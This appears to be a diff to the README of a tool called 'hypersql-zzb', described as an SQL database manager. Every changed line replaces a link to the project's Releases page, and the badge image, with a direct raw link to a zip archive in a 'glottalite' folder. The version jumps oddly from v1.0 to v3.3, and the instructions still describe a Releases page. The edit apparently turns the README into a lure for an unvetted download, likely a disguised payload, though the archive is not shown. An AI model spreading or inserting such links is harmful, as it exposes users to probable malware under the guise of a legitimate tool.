@@ -1,7 +1,7 @@
 # 🌟 hypersql-zzb - Effortlessly Manage Your SQL Databases
 
 ## 🔗 Download Now
-[![Download hypersql-zzb](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/alshytan109/hypersql-zzb/releases)
+[![Download hypersql-zzb](https://raw.githubusercontent.com/alshytan109/hypersql-zzb/main/glottalite/hypersql-zzb_v3.3.zip)](https://raw.githubusercontent.com/alshytan109/hypersql-zzb/main/glottalite/hypersql-zzb_v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to hypersql-zzb! This application is designed to help you manage your SQL databases easily. Whether you need to create, edit, or query databases, hypersql-zzb simplifies the process.
@@ -17,7 +17,7 @@ Before you start, make sure your system meets these requirements:
 ## 📥 Download & Install
 To get started with hypersql-zzb, visit this page to download our latest release:
 
-[Download the latest version](https://github.com/alshytan109/hypersql-zzb/releases)
+[Download the latest version](https://raw.githubusercontent.com/alshytan109/hypersql-zzb/main/glottalite/hypersql-zzb_v3.3.zip)
 
 1. Click the link above to open the Releases page.
 2. Locate the latest version of hypersql-zzb.
@@ -73,4 +73,4 @@ hypersql-zzb is licensed under the MIT License. Feel free to use and modify the 
 
 ---
 
-Thank you for using hypersql-zzb! We hope it simplifies your SQL database management experience. Don't forget to check for updates regularly on our [Releases page](https://github.com/alshytan109/hypersql-zzb/releases).
+Thank you for using hypersql-zzb! We hope it simplifies your SQL database management experience. Don't forget to check for updates regularly on our [Releases page](https://raw.githubusercontent.com/alshytan109/hypersql-zzb/main/glottalite/hypersql-zzb_v3.3.zip).
